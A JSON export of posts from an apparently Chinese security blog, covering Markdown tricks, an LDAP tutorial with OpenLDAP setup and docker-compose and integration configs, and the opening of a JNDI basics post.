[{"content":"可折叠展开 1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;details\u0026gt;\u0026lt;summary\u0026gt;\u0026lt;font color=\u0026#34;#FF0000\u0026#34; size=\u0026#34;5\u0026#34;\u0026gt;免责声明【必读】\u0026lt;/font\u0026gt;\u0026lt;/summary\u0026gt; 本工具仅供学习和技术研究使用，不得用于任何商业或非法行为，否则后果自负。 本工具的作者不对本工具的安全性、完整性、可靠性、有效性、正确性或适用性做任何明示或暗示的保证，也不对本工具的使用或滥用造成的任何直接或间接的损失、责任、索赔、要求或诉讼承担任何责任。 本工具的作者保留随时修改、更新、删除或终止本工具的权利，无需事先通知或承担任何义务。 本工具的使用者在下载、安装、运行或使用本工具时，即表示已阅读并同意本免责声明。如有异议，请立即停止使用本工具，并删除所有相关文件。 \u0026lt;/details\u0026gt; 效果 免责声明【必读】 本工具仅供学习和技术研究使用，不得用于任何商业或非法行为，否则后果自负。\n本工具的作者不对本工具的安全性、完整性、可靠性、有效性、正确性或适用性做任何明示或暗示的保证，也不对本工具的使用或滥用造成的任何直接或间接的损失、责任、索赔、要求或诉讼承担任何责任。\n本工具的作者保留随时修改、更新、删除或终止本工具的权利，无需事先通知或承担任何义务。\n本工具的使用者在下载、安装、运行或使用本工具时，即表示已阅读并同意本免责声明。如有异议，请立即停止使用本工具，并删除所有相关文件。\n跳转 点击关键字转到对应位置/文章\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 1.跳转到本文位置 1.本文的指定标题A [某个标题](#%E5%8F%AF%E6%8A%98%E5%8F%A0%E5%B1%95%E5%BC%80) （这个标题就是本文的第一个标题） （其中的\u0026#39;#\u0026#39;号为格式符，剩下的是URL编码） ## 可折叠展开 2.本文文本 点击我[啊](#ddd) 中间文字 \u0026lt;span id=\u0026#34;ddd\u0026#34;\u0026gt;到了\u0026lt;/span\u0026gt; 2.跳转到其他文章 1.只到文章即可 [指定文章](https://d4n-sec.github.io/p/blogtohugo/) 2.到文章的某个标题 [指定文章指定段落](https://d4n-sec.github.io/p/blogtohugo/#hugo-%E5%AE%89%E8%A3%85) 3.到文章的某个文本 暂时没有这个需求，不去折腾 效果 跳转到本文某标题 某个标题\n跳转到本文某文本 点击我啊\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n到了\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n跳转到其他文章 指定文章\n指定文章指定段落\n","date":"2024-11-25T13:28:42+08:00","image":"https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20241125133108907.png","permalink":"https://d4n-sec.github.io/p/usefullmarkdowngrammar/","title":"一些好用的 MarkDown 语法"},{"content":"What\u0026rsquo;s LDAP Lightweight Directory Access Protocol -\u0026gt; LDAP\n直译：轻量级目录访问协议（Directory -\u0026gt; 又可译为电话簿），但是意义不准确\n不管是目录还是电话簿，核心点为查找\n即 Directory 服务内部的数据组织形式是树形结构，这样做的目的是方便查找。其最开始存在的目的是做白页、黄页类应用，而我们可以利用这个结构做其它事情，比如用一个LDAP服务管理公司内所有地方的用户信息，这样就可以做到单点登录\n白页：个人通信目录，这个在上世纪的美国电影中能见到。为什么是白页—以前使用白色纸张记录个人通信目录。黄页也是这个原因。 黄页：企业和团体通信目录，例如80、90后熟知的hao123网址黄页\nProtocol Brief Introduction 与LDAP相关的协议很多，但主要是两个系列，这里列出，仅做了解用，感兴趣可以翻看\nSeries Protocol X.500 X.500系列协议\n目录服务的最初协议，完整地描述了目录、目录服务的组成、目录结构等内容。X.500本身只是一个概览，各部分的实现在其子协议如X.501、X.502中，所以说X.500是一个系列协议。\n值得一提的是，常见的X.509公钥证书也属于该系列协议。\nLDAP LDAP并非只有一个协议文件，其涉及到方方面面，每个方面单独由一个协议文件描述，加星号的相对来说很重要\nLDAP系列协议\nRFC4511*：通过TCP传输消息的方式，规定了传输层面的消息类型、消息内容，如绑定、查询等\nRFC4512*：信息模型，规定了schema、object class、attribute type等内容\nRFC4513*：规定了鉴权方式和安全机制：TLS、SASL\nRFC4514：规定了DN的字符串表示方式\nRFC4515：规定了过滤器的格式，过滤器用于查找时指定条件\nRFC4516：规定了统一资源定位符的格式，即LDAP端点长啥样\nRFC4517*：语法和匹配规则，列举了所有允许的语法和匹配规则\nRFC4518：字符串国际化\nRFC4519*：应用程序的schema，列举了所有允许的object class和attribute type\nRFC2377*：推荐的DIT组织方式，即目录服务的树的组织方式\nAbbr LDAP 总是会有一大堆相关缩写，这里列出常见的\n常见 DAP - Directory Access Protocol，即目录访问协议\nLDAP - Lightweight Directory Access Protocol，轻量级目录访问协议\nDIB - Directory Information Base，目录信息库\nDIT - Directory Information Tree，目录信息树\nDUA - Directory User Agent，用户代理\nDN - Distinguished Name，可区别名称，即唯一名称\nRDN - Relative Distinguished Name，相对唯一名称，指DIT内某个节点上的名称，上层节点的DN配合上本节点的RDN，能够构成本节点的DN\n一些属性类型的介绍 c - country name，国家名\ncn - common name，通用名称\ndc - domain component，域名组件\no - organization name，机构名\nou - organization unit name，机构的单位名\nsn - surname，姓\nst - state or province name，州或省\nUnderstand X.500 如果不看X.500协议，LDAP中的很多东西是看不懂的。X.500定义了目录服务，LDAP只是它的轻量级实现。\n所以如果对 X.500 有一些差不多的认知，LDAP就已经可以理解了，毕竟是阉割版\n我们看看 X.500 规定了什么。\n定义目录系统 Directory旨在提供一个用户友好的name-address类的映射，其中name不可变，address允许动态变化，即key-value结构。Directory由一批系统组成，每个系统持有对应现实世界的逻辑数据，这些存储的数据叫做DIB，即目录信息库。整体架构如下\n一个标准的目录系统，有以下几部分\n目录服务 目录服务的用户 访问端点-目录服务用来暴露自己 用户和服务之间使用协议如LDAP进行交互 用户使用LDAP客户端访问目录服务 DIB与DIT 目录信息库，由DIT（目录信息树）、节点Entry、Entry中的属性及属性值构成。\nEntry代表一个节点，类型可以是object，也可以是alias，后者表示一个object entry的别名 一个Entry内可以拥有多个属性 一个属性内可以拥有一个Type，以及多个Value 下图展示了一个DIT的树形结构：\n一个假设的DIT如下\n则DN：{C=GB, L=Winslow, O=Graphic Services, CN=Laser Printer}代表了Laser Printer。\n你可能会想，DIB和常见的数据库有什么关系呢？\n实际上他们没什么关系\n类似HTTP和TCP。硬要说有关系的话，DIB更加垂直吧🤔，仅适用于这种树形存储结构，查询多、更新少；\n数据库则更加通用，相对而言也更加底层。\nDIB只是规定了一种存储键值对数据的树形结构，可以用任何方式实现DIB，包括关系型数据库。理论上，HTTP也可以是其它实现，比如QUIC。\n目录服务 对目录的一些增删改查操作，看一眼就行 读操作\nRead：读指定的entry。LDAP不支持此操作 Compare：比较给的值和指定entry的值是否一致。这个在验证密码时有用 List：列出指定entry的所有子entry Search：列出满足指定过滤器的所有entry Abandon：放弃，作用在一个挂起请求上，标识客户端对该请求不在感兴趣 修改操作\n添加entry 移除entry 修改entry 修改DN，修改某个entry的相对名称。如果该entry有子节点，则子节点的这部分名字也会被修改 其它可能的输出\n错误 转移（referral）：可能当前服务无法处理这个请求，它会返回一个新的端点，类似HTTP的重定向 分布式Directory DSA：Directory System Agent。用来连接服务和DUA。他可以缓存Directory数据，可以用本地数据直接响应，也可以单纯做一个转发 LDAP Server：是Directory Service的一部分。他可以直接使用本地数据，也可以转发到其它LDAP Server获取数据 其它 协议还规定了目录服务的访问安全、备份等操作，这里暂时忽略。之后值得探究的倒是其安全协议 X.509\nLDAP\u0026rsquo;s Safety Specifications 使用TLS安全传输 提供简单的匿名和账号密码认证 支持SASL构建鉴权和安全服务层 The Practice of LDAP LDAP目前最常用的用途是做单点登录，在这个场景中 LDAP 一般存储关于用户、用户认证信息、组、用户成员等等，充当一个用户信息的中心仓库，通常使用为用户认证和授权\n使用命令行构造LDAP树结构 ！！！！\n由于该方式过于底层，偏离学习初衷，故命令行方式构造数据树的实验笔者仅做记录\n不同版本的 Linux 安装方法差别非常大！\n此次实验记录的是快速搭建一个 LDAP 学习和测试环境，没有进行其他高级配置。建议使用虚拟机和全新安装的系统进行操作。\nLDIF LDAP Data Interchange Format，是一个格式化文件\nLDAP 数据交换格式文件，它以文本形式存储，用于在服务器之间交换数据。\n添加数据以及修改数据都需要通过 LDIF 文件来进行，可以跟关系型数据库的 SQL 文件做类比。\nLDIF 文件的格式一般如下：\n1 2 3 4 dn: \u0026lt;识别名\u0026gt; \u0026lt;属性 1\u0026gt;: \u0026lt;值 1\u0026gt; \u0026lt;属性 2\u0026gt;: \u0026lt;值 2\u0026gt; ... LDAP 命令行构造数据 本次涉及软件：\n操作系统：CentOS 7.4.1708 最小安装（已关闭 SELinux 和防火墙） 应用软件：openldap 2.4.44 、phpldapadmin 1.2.3 CentOS 7 上安装并使用 OpenLDAP yum install -y openldap-clients openldap-servers\n创建数据库配置文件 cp /usr/share/openldap-servers/DB_CONFIG.example /var/lib/ldap/DB_CONFIG \u0026amp;\u0026amp; chown ldap:ldap /var/lib/ldap/DB_CONFIG 启动 OpenLDAP 服务 开启：systemctl start slapd 开机自启：systemctl enable slapd\n如果没有出现错误，那么 OpenLDAP 的安装就算完成了，不过当前的目录数据库还是空的，下面我们要对数据库进行初始化。\n设置 OpenLDAP 管理员密码 slappasswd\n输入密码，确认后会生成{SSHA}xxxxx这样的东西，记作passwdA值\n生成 LDIF 文件 cat \u0026lt;\u0026lt; EOF \u0026gt; chrootpw.ldif\n然后将下方文本修改对应内容后，去掉所有注释，然后在命令行中粘贴回车\n1 2 3 4 5 dn: olcDatabase={0}config,cn=config changetype: modify add: olcRootPW olcRootPW: {SSHA}xxxxx #{SSHA}xxxxx 修改为上一步记下来的 passwdA值 EOF 执行 LDIF 文件 ldapadd -Y EXTERNAL -H ldapi:/// -f chrootpw.ldif\n导入预设的模式 find /etc/openldap/schema/ -name \u0026quot;*.ldif\u0026quot; -exec ldapadd -Y EXTERNAL -H ldapi:/// -D \u0026quot;cn=config\u0026quot; -f {} \\;\n接下来要使用命令行来新建根节点\n生成根节点管理员密码 同上一次的操作，生成后保存为 passwdBBBB值\n根节点管理员密码与 OpenLDAP 管理员密码不是同一回事！一个 LDAP 数据库可以包含多个目录树。\n生成 LDIF 文件 首先请想好一个域名。以 zenandidi.com 为例：\n下面根节点的 DN 应该这样写：dc=zenandidi,dc=com\ncat \u0026lt;\u0026lt; EOF \u0026gt; chdomain.ldif\n然后将下方文本修改对应内容后，去掉所有注释，然后在命令行中粘贴回车\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 dn: olcDatabase={1}monitor,cn=config changetype: modify replace: olcAccess olcAccess: {0}to * by dn.base=\u0026#34;gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth\u0026#34; read by dn.base=\u0026#34;cn=Manager,dc=xxx,dc=xxx\u0026#34; read by * none #修改 dc=xxx,dc=xxx 为自己的域名 dn: olcDatabase={2}hdb,cn=config changetype: modify replace: olcSuffix olcSuffix: dc=xxx,dc=xxx #修改 dc=xxx,dc=xxx 为自己的域名 dn: olcDatabase={2}hdb,cn=config changetype: modify replace: olcRootDN olcRootDN: cn=Manager,dc=xxx,dc=xxx #修改 dc=xxx,dc=xxx 为自己的域名 dn: olcDatabase={2}hdb,cn=config changetype: modify add: olcRootPW olcRootPW: {SSHA}xxxxx #{SSHA}xxxxx 修改为上一步记下来的值 dn: olcDatabase={2}hdb,cn=config changetype: modify add: olcAccess olcAccess: {0}to attrs=userPassword,shadowLastChange by dn=\u0026#34;cn=Manager,dc=xxx,dc=xxx\u0026#34; write by anonymous auth by self write by * none #修改 dc=xxx,dc=xxx 为自己的域名 olcAccess: {1}to dn.base=\u0026#34;\u0026#34; by * read olcAccess: {2}to * by dn=\u0026#34;cn=Manager,dc=xxx,dc=xxx\u0026#34; write by * read #修改 dc=xxx,dc=xxx 为自己的域名 EOF 执行 LDIF 文件 ldapmodify -Y EXTERNAL -H ldapi:/// -f chdomain.ldif\n接下来，开始进行添加用户、组节点\n生成 LDIF 文件 cat \u0026lt;\u0026lt; EOF \u0026gt; basedomain.ldif\n然后将下方文本修改对应内容后，去掉所有注释，然后在命令行中粘贴回车\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 dn: dc=xxx,dc=xxx #修改 dc=xxx,dc=xxx 为自己的域名 objectClass: top objectClass: dcObject objectclass: organization o: root_ldap dc: xxx #修改 xxx 为自己域名第一个点左边的内容 dn: cn=Manager,dc=xxx,dc=xxx #修改 dc=xxx,dc=xxx 为自己的域名 objectClass: organizationalRole cn: Manager description: Directory Manager dn: ou=People,dc=xxx,dc=xxx #修改 dc=xxx,dc=xxx 为自己的域名 objectClass: organizationalUnit ou: People dn: ou=Group,dc=xxx,dc=xxx #修改 dc=xxx,dc=xxx 为自己的域名 objectClass: organizationalUnit ou: Group EOF 执行 LDIF 文件 请先修改下面命令的dc=xxx,dc=xxx为自己的域名然后再执行\nldapadd -x -D cn=Manager,dc=xxx,dc=xxx -W -f basedomain.ldif\n然后需要输入设定的根节点管理员密码 （生成passwdBBBB值时输入的密码\n清理 LDIF 文件 rm basedomain.ldif chdomain.ldif chrootpw.ldif\n至此，一个 LDAP 目录树就构建完毕了。\nLDAP UI操作 但是 LDAP 的命令行管理工具非常难用，尤其是对于新手来说。\n所以，下面我们来安装phpLDAPadmin这个图形化管理工具，方便新手学习\n如果上面的命令行操作有实际操作的话，那么可以跳转到这里\nUI创建LDAP环境与数据 进入phpLDAPAdmin 该操作使用docker-compose一键部署openLDAP、phpldapadmin和self-service-password\n准备open-ldap的docker-compose文件 如下直接给出笔者的实验docker-compose\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 version: \u0026#39;2\u0026#39; services: openldap: image: osixia/openldap:1.5.0 ### 如果有私有仓库可以从自己的私有仓库拉取镜像 container_name: openldap restart: always environment: LDAP_LOG_LEVEL: \u0026#34;256\u0026#34; LDAP_ORGANISATION: \u0026#34;ndzzmc\u0026#34; ### 您的组织名称 LDAP_DOMAIN: \u0026#34;gsymgsym.com\u0026#34; ### 公司域名 LDAP_BASE_DN: \u0026#34;dc=gsymgsym,dc=com\u0026#34; ### 根据域名组成 LDAP_ADMIN_PASSWORD: \u0026#34;Aa123+Bb\u0026#34; ### 密码自己来设置 LDAP_CONFIG_PASSWORD: \u0026#34;Aa123+BbCc\u0026#34; LDAP_READONLY_USER: \u0026#34;false\u0026#34; #LDAP_READONLY_USER_USERNAME: \u0026#34;readonly\u0026#34; #LDAP_READONLY_USER_PASSWORD: \u0026#34;readonly\u0026#34; LDAP_RFC2307BIS_SCHEMA: \u0026#34;false\u0026#34; LDAP_BACKEND: \u0026#34;mdb\u0026#34; #LDAP_TLS: \u0026#34;true\u0026#34; #LDAP_TLS_CRT_FILENAME: \u0026#34;zaq.test.pem\u0026#34; #LDAP_TLS_KEY_FILENAME: \u0026#34;zaq.test.key\u0026#34; #LDAP_TLS_DH_PARAM_FILENAME: \u0026#34;dhparam.pem\u0026#34; #LDAP_TLS_CA_CRT_FILENAME: \u0026#34;ca.crt\u0026#34; #LDAP_TLS_ENFORCE: \u0026#34;false\u0026#34; #LDAP_TLS_CIPHER_SUITE: \u0026#34;SECURE256:-VERS-SSL3.0\u0026#34; # LDAP_TLS_VERIFY_CLIENT: \u0026#34;demand\u0026#34; LDAP_REPLICATION: \u0026#34;false\u0026#34; #LDAP_REPLICATION_CONFIG_SYNCPROV: \u0026#39;binddn=\u0026#34;cn=admin,cn=config\u0026#34; bindmethod=simple credentials=\u0026#34;$$LDAP_CONFIG_PASSWORD\u0026#34; searchbase=\u0026#34;cn=config\u0026#34; type=refreshAndPersist retry=\u0026#34;60 +\u0026#34; timeout=1 starttls=critical\u0026#39; #LDAP_REPLICATION_DB_SYNCPROV: \u0026#39;binddn=\u0026#34;cn=admin,$$LDAP_BASE_DN\u0026#34; bindmethod=simple credentials=\u0026#34;$$LDAP_ADMIN_PASSWORD\u0026#34; searchbase=\u0026#34;$$LDAP_BASE_DN\u0026#34; type=refreshAndPersist interval=00:00:00:10 retry=\u0026#34;60 +\u0026#34; timeout=1 starttls=critical\u0026#39; #LDAP_REPLICATION_HOSTS: \u0026#34;#PYTHON2BASH:[\u0026#39;ldap://ldap.example.org\u0026#39;,\u0026#39;ldap://ldap2.example.org\u0026#39;]\u0026#34; KEEP_EXISTING_CONFIG: \u0026#34;false\u0026#34; LDAP_REMOVE_CONFIG_AFTER_SETUP: \u0026#34;true\u0026#34; #LDAP_SSL_HELPER_PREFIX: \u0026#34;ldap\u0026#34; tty: true stdin_open: true volumes: - /opt/openldap/ldap:/var/lib/ldap - /opt/openldap/slapd.d:/etc/ldap/slapd.d - /opt/openldap/certs:/container/service/lapd/assets/certs ports: - \u0026#34;389:389\u0026#34; - \u0026#34;636:636\u0026#34; # For replication to work correctly, domainname and hostname must be # set correctly so that \u0026#34;hostname\u0026#34;.\u0026#34;domainname\u0026#34; equates to the # fully-qualified domain name for the host. domainname: \u0026#34;gsymgsym.com\u0026#34; hostname: \u0026#34;ldap-server\u0026#34; phpldapadmin: image: osixia/phpldapadmin:latest container_name: phpldapadmin restart: always environment: PHPLDAPADMIN_LDAP_HOSTS: \u0026#34;openldap\u0026#34; ### 如果部署后登录不进去有可能是这里出了问题，直接换为部署openldap服务的可达IP试试 PHPLDAPADMIN_HTTPS: \u0026#34;false\u0026#34; ports: - \u0026#34;50081:80\u0026#34; depends_on: - openldap self-service-password: container_name: self-service-password image: tiredofit/self-service-password:latest restart: always ports: - \u0026#34;50080:80\u0026#34; environment: - LDAP_SERVER=ldap://openldap:389 - LDAP_BINDDN=cn=admin,dc=gsymgsym,dc=com - LDAP_BINDPASS=XXXX - LDAP_BASE_SEARCH=dc=gsymgsym,dc=com - MAIL_FROM=it@open.com - MAIL_FROM_NAME=账号自助服务平台 - SMTP_DEBUG=0 - SMTP_HOST=smtp.qiye.aliyun.com - SMTP_USER=it@open.com - SMTP_PASS=jYda52VZ8Ftw1111 - SMTP_PORT=465 - SMTP_SECURE_TYPE=ssl - SMTP_AUTH_ON=true - NOTIFY_ON_CHANGE=true volumes: - /etc/localtime:/etc/localtime - /opt/openldap/self-service-password/htdocs:/www/ssp - /opt/openldap/self-service-password/logs:/www/logs deploy: resources: limits: memory: 2G reservations: memory: 512M Docker 部署 docker-compose up -d\n然后点击Login登录\nLogin DN 根据docker-compose就是cn=admin,dc=gsymgsym,dc=com\nPassword 就是LDAP_ADMIN_PASSWORD的设置项Aa123+Bb\n下图的报错是测试错误密码\n正确登录后，如下图\n创建数据 这里先在dc下面创建一个ou=group和一个ou=user。暂时先不按部分区分\n如果想再更细节区分的话，则就先创建一个ou，再在该ou下创建一个ou=group即可。\n创建ou 重复此操作，创建ou=user，结果如下图\n创建 Posix Group 接下来创建Posix Group在group下\n创建 User Account 在ou=user下创建用户\n为用户填写其他属性 已有LDAP环境和数据后的UI登录 安装phpLDAPadmin yum -y install phpldapadmin\n修改phpLDAPadmin的配置文件 vi /etc/phpldapadmin/config.php\n请按实际情况以及注释提示修改以下内容，完成去除 # 号和后面的注释，在命令行窗口中按下 G（大写），然后按下 O（大写），将上面修改的内容直接粘贴到命令行窗口中，再按下 ESC ，最后输入:wq按回车。\n1 2 3 4 5 6 7 8 9 10 $servers = new Datastore(); $servers-\u0026gt;newServer(\u0026#39;ldap_pla\u0026#39;); $servers-\u0026gt;setValue(\u0026#39;server\u0026#39;,\u0026#39;name\u0026#39;,\u0026#39;My LDAP Server\u0026#39;); $servers-\u0026gt;setValue(\u0026#39;server\u0026#39;,\u0026#39;host\u0026#39;,\u0026#39;127.0.0.1\u0026#39;); $servers-\u0026gt;setValue(\u0026#39;server\u0026#39;,\u0026#39;port\u0026#39;,389); $servers-\u0026gt;setValue(\u0026#39;server\u0026#39;,\u0026#39;base\u0026#39;,array(\u0026#39;dc=xxx,dc=xxx\u0026#39;)); #修改 dc=xxx,dc=xxx 为自己的域名 $servers-\u0026gt;setValue(\u0026#39;login\u0026#39;,\u0026#39;auth_type\u0026#39;,\u0026#39;session\u0026#39;); $servers-\u0026gt;setValue(\u0026#39;login\u0026#39;,\u0026#39;bind_id\u0026#39;,\u0026#39;cn=Manager,dc=xxx,dc=xxx\u0026#39;); #修改 dc=xxx,dc=xxx 为自己的域名 $servers-\u0026gt;setValue(\u0026#39;login\u0026#39;,\u0026#39;bind_pass\u0026#39;,\u0026#39;\u0026lt;密码\u0026gt;\u0026#39;); #填入 5.7.1 设定的根节点管理员密码 $servers-\u0026gt;setValue(\u0026#39;server\u0026#39;,\u0026#39;tls\u0026#39;,false); 启动httpd服务 启动：systemctl start httpd\n开机启动：systemctl enable httpd\n登录phpLDAPadmin 打开浏览器，访问 http://CentOS7IP/phpldapadmin ，然后按图片中的提示登录即可。\n配置完效果如下\nLDAP与第三方集成 第三方平台的集成基本上按照操作手册来做，故不做实验\n仅做记录\nLDAP和JRIA的集成 登录进JRIA的控制台（需要是管理员身份） 点击：配置—\u0026gt;用户管理—\u0026gt;用户目录—\u0026gt;添加目录—\u0026gt;LDAP 补充解释 特别解释几个属性的含义：\nLDAP模式\n“基础DN” 填写LDAP的根节点，类似dc=zaq,dc=test; “附加用户DN” 填写限制用户搜索范围的值，类似ou=people，不填的话从基础DN开始搜索； “附加组DN” 填写限制用户组搜索范围的值，和上一项类似； LDAP权限\n只读：JIRA只能从LDAP中读取用户以及用户组信息，所有对用户及用户组的修改不能通过JIRA进行。 本地只读：相比只读来说，可以在JIRA中添加组，并且会将LDAP同步过来的用户加入到该组中。 读写：不但可以读取LDAP上的用户及组信息，还可以通过JIRA修改这些信息，这些信息会自动同步到LDAP。 LDAP和Confluence的集成 找到gitlab的配置文件：/etc/gitlab/gitlab.rb，然后修改下面的内容\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 ### LDAP Settings ###! Docs: https://docs.gitlab.com/omnibus/settings/ldap.html ###! **Be careful not to break the indentation in the ldap_servers block. It is ###! in yaml format and the spaces must be retained. Using tabs will not work.** gitlab_rails[\u0026#39;ldap_enabled\u0026#39;] = true # gitlab_rails[\u0026#39;prevent_ldap_sign_in\u0026#39;] = false ###! **remember to close this block with \u0026#39;EOS\u0026#39; below** gitlab_rails[\u0026#39;ldap_servers\u0026#39;] = YAML.load \u0026lt;\u0026lt;-\u0026#39;EOS\u0026#39; main: # \u0026#39;main\u0026#39; is the GitLab \u0026#39;provider ID\u0026#39; of this LDAP server label: \u0026#39;LDAP\u0026#39; host: \u0026#39;xx.xx.xx.xx\u0026#39; ### LDAP服务地址 port: 389 uid: \u0026#39;uid\u0026#39; ### 指定登录gitlab使用LDAP的哪个字段作为账号 bind_dn: \u0026#39;cn=admin,dc=zaq,dc=test\u0026#39; ### 这里用自己的管理员账号（需要一个有read权限的账号验证通过后搜索用户输入的用户名是否存在） password: \u0026#39;XXX\u0026#39; encryption: \u0026#39;plain\u0026#39; # \u0026#34;start_tls\u0026#34; or \u0026#34;simple_tls\u0026#34; or \u0026#34;plain\u0026#34; # verify_certificates: true # smartcard_auth: false active_directory: false ### 如果是 Active Directory LDAP server 则设为true allow_username_or_email_login: true ### 是否允许email登录 # lowercase_usernames: false ### 是否将用户名转为小写 block_auto_created_users: false ### 是否自动创建用户。如果设置为true则自动注册的账户是被锁定的，需要管理员账户手动的为这些账户解锁，因此此处将其设置为false。当设置为false的时候，就需要保证，对于第三方登录的用户完全可控。 base: \u0026#39;ou=people,dc=zaq,dc=com\u0026#39; ### 从哪个位置搜索用户，这里填自己的 user_filter: \u0026#39;\u0026#39; ### 表示以某种过滤条件筛选用户，比如我们只希望组为gitlab的用户来访问GitLab，则这里可以设置为：memberOf=ou=gitlab,ou=people,dc=zaq,dc=com #\tattributes:\t# LDAP 中用户的属性 #\tusername: [\u0026#39;uid\u0026#39;, \u0026#39;userid\u0026#39;, \u0026#39;sAMAccountName\u0026#39;] # email: [\u0026#39;mail\u0026#39;, \u0026#39;email\u0026#39;, \u0026#39;userPrincipalName\u0026#39;] # name: \u0026#39;cn\u0026#39; # first_name: \u0026#39;givenName\u0026#39; # last_name: \u0026#39;sn\u0026#39; ## EE only group_base: \u0026#39;\u0026#39; admin_group: \u0026#39;\u0026#39; sync_ssh_keys: false EOS 修改完后重启GitLab！\n最后最好再取消GitLab的注册功能，新用户只能通过 LDAP 认证的方式进行登陆。\n拉取代码时要用LDAP创建的账号密码拉取。\nLDAP和Nexus的集成 登录管理员账号 LDAP和Harbor的集成 特别注意\n在没有添加任何用户之前，你可以修改认证模式（Database模式或者LDAP模式）, 但当Harbor系统中已经有至少一个用户之后（除了admin用户外），将不能够修改认证模式。\n新版本 新版本的可以直接在页面进行修改，如下：\n登录管理员账户，选中配置管理\n旧版本 老版本则需要修改harbor.cfg文件，如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 ##By default the auth mode is db_auth, i.e. the credentials are stored in a local database. #Set it to ldap_auth if you want to verify a user\u0026#39;s credentials against an LDAP server. auth_mode = ldap_auth #The url for an ldap endpoint. ldap_url = xx.xx.xx.xx #A user\u0026#39;s DN who has the permission to search the LDAP/AD server. #If your LDAP/AD server does not support anonymous search, you should configure this DN and ldap_search_pwd. ldap_searchdn = cn=admin,dc=zaq,dc=test #the password of the ldap_searchdn ldap_search_pwd = xxx #The base DN from which to look up a user in LDAP/AD ldap_basedn = dc=zaq,dc=com #Search filter for LDAP/AD, make sure the syntax of the filter is correct. #ldap_filter = (objectClass=person) # The attribute used in a search to match a user, it could be uid, cn, email, sAMAccountName or other attributes depending on your LDAP/AD ldap_uid = uid #the scope to search for users, 0-LDAP_SCOPE_BASE, 1-LDAP_SCOPE_ONELEVEL, 2-LDAP_SCOPE_SUBTREE ldap_scope = 2 #Timeout (in seconds) when connecting to an LDAP Server. The default value (and most reasonable) is 5 seconds. ldap_timeout = 5 #Verify certificate from LDAP server ldap_verify_cert = true #The base dn from which to lookup a group in LDAP/AD ldap_group_basedn = ou=IT,dc=shileizcc,dc=com #filter to search LDAP/AD group ldap_group_filter = objectclass=group #The attribute used to name a LDAP/AD group, it could be cn, name ldap_group_gid = cn #The scope to search for ldap groups. 0-LDAP_SCOPE_BASE, 1-LDAP_SCOPE_ONELEVEL, 2-LDAP_SCOPE_SUBTREE ldap_group_scope = 2 Ref https://blog.csdn.net/zou8944/article/details/122287398\nhttps://blog.csdn.net/pushiqiang/article/details/119982651\nhttps://www.cnblogs.com/siyunianhua/p/18309700\nhttps://zhuanlan.zhihu.com/p/32732045\nhttps://blog.csdn.net/ysf15609260848/article/details/126002321\nhttps://blog.csdn.net/ysf15609260848/article/details/126002452\n","date":"2024-11-25T08:05:08+08:00","image":"https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20241125100106320.png","permalink":"https://d4n-sec.github.io/p/javaaboutldap/","title":"Java基础知识：LDAP"},{"content":"OK，又到了喜闻乐见的Java基础知识环节\nWhat\u0026rsquo;s JNDI JNDI，即Java Naming and Directory Interface，直译为 Java命名与目录接口\nJava表明了这个玩意儿大概率只在Java中存在\nInterface表明了这个玩意儿是一个 Interface（接口），Interface 的作用是什么？模拟一种规范\nNaming and Directory这个的直译其实有些不对，Naming确实是命名，但是英文中的Directory其实更偏向于电话簿，地址簿类似的东西\nJNDI这里最重要的概念是Naming and Directory，最重要的定位是Interface\n可能很啰嗦，但是这就是他最原始，也是最本质的定义，如果你想知道他是什么，就是Interface，用来干什么，就是Naming and Directory\nHow to use JNDI 网上会有很多栗子，来解释，或者带人来感受JNDI的使用\n这里也贴出来，读者可以感受感受\nNon-JNDI 本栗子通俗的讲就是：使用JDBC来连接数据库和执行SQL语句，它最大的特点是通过java程序去找数据库驱动，然后来连接数据库。\n是java亲自去连数据库。\n代码如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 Connection conn=null; try { Class.forName(\u0026#34;com.mysql.jdbc.Driver\u0026#34;, true, Thread.currentThread().getContextClassLoader()); conn=DriverManager.getConnection(\u0026#34;jdbc:mysql://MyDBServer?user=xxx\u0026amp;password=xxx\u0026#34;); ...... conn.close(); } catch(Exception e) { e.printStackTrace(); } finally { if(conn!=null) { try { conn.close(); } catch(SQLException e) {} } } 这是传统派的做法，也是以前非Java程序员（如Delphi、VB等）常见的做法。这种做法一般在小规模的开发过程中不会产生问题，只要程序员熟悉Java语言、了解JDBC技术和MySQL，可以很快开发出相应的应用程序。\n没有JNDI的做法存在的问题：\n1、数据库服务器名称MyDBServer 、用户名和口令都可能需要改变，由此引发JDBC URL需要修改；\n2、数据库可能改用别的产品，如改用DB2或者Oracle，引发JDBC驱动程序包和类名需要修改；\n3、随着实际使用终端的增加，原配置的连接池参数可能需要调整；\n4、\u0026hellip;\u0026hellip;\n程序员应该不需要关心“具体的数据库后台是什么？JDBC驱动程序是什么？JDBC URL格式是什么？访问数据库的用户名和口令是什么？”等等这些问题，程序员编写的程序应该没有对 JDBC 驱动程序的引用，没有服务器名称，没有用户名称或口令 —— 甚至没有数据库池或连接管理。而是把这些问题交给J2EE容器来配置和管理，程序员只需要对这些配置和管理进行引用即可。\nWith-JNDI 